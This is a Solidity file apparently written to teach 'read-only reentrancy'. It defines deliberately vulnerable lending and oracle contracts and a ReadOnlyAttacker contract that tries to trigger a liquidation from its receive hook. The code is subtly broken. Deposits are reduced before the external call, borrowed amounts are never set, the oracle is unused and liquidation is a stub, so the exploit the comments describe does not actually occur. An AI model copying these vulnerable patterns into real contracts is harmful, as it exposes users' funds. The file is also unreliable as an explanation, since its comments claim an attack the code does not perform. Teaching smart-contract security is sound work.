// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Attack 3: Read-Only Reentrancy
// Modern DeFi vulnerability - manipulating view functions during execution

contract PriceOracle {
    mapping(address => uint256) public prices;
    
    function updatePrice(address token, uint256 price) external {
        prices[token] = price;
    }
    
    // VULNERABLE: Returns stale data during reentrancy
    function getPrice(address token) external view returns (uint256) {
        return prices[token];
    }
}

contract LendingPool {
    PriceOracle public oracle;
    mapping(address => uint256) public deposits;
    mapping(address => uint256) public borrowed;
    
    bool private locked;
    
    constructor(address _oracle) {
        oracle = PriceOracle(_oracle);
    }
    
    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }
    
    function withdraw(uint256 amount) external {
        require(!locked, "Locked");
        require(deposits[msg.sender] >= amount, "Insufficient");
        
        locked = true;
        deposits[msg.sender] -= amount;
        
        // External call - attacker can read stale state
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success);
        
        locked = false;
    }
    
    // View function - can be called during reentrancy
    function getCollateralRatio(address user) external view returns (uint256) {
        uint256 collateral = deposits[user];
        uint256 debt = borrowed[user];
        
        if (debt == 0) return type(uint256).max;
        return (collateral * 100) / debt;
    }
}

contract DependentProtocol {
    LendingPool public pool;
    
    constructor(address _pool) {
        pool = LendingPool(_pool);
    }
    
    // VULNERABLE: Relies on view function that can return stale data
    function liquidate(address user) external {
        uint256 ratio = pool.getCollateralRatio(user);
        
        // If ratio < 150%, liquidate
        require(ratio < 150, "Healthy position");
        
        // Liquidation logic...
    }
}

contract ReadOnlyAttacker {
    LendingPool public pool;
    DependentProtocol public protocol;
    
    constructor(address _pool, address _protocol) {
        pool = LendingPool(_pool);
        protocol = DependentProtocol(_protocol);
    }
    
    receive() external payable {
        // During withdraw, pool state is inconsistent
        // getCollateralRatio() returns wrong value
        // Dependent protocol makes wrong decision
        
        try protocol.liquidate(address(this)) {
            // Exploit successful - liquidated with stale data
        } catch {}
    }
    
    function attack() external payable {
        pool.deposit{value: msg.value}();
        pool.withdraw(msg.value);
    }
}
